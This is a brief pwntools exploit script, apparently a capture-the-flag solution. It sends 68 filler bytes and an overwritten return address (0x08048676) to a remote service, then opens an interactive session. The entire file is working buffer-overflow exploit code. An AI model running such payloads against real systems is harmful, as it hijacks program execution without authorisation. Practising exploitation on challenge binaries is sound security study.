from pwn import *

#r = process("./return")
r = remote("103.200.7.150",30401)
offset = 68
target = p32(0x08048676)
payload = ""
payload += "A"*offset
payload += target
r.sendline("4")
r.sendline(payload)
r.recvrepeat(1)
r.interactive()
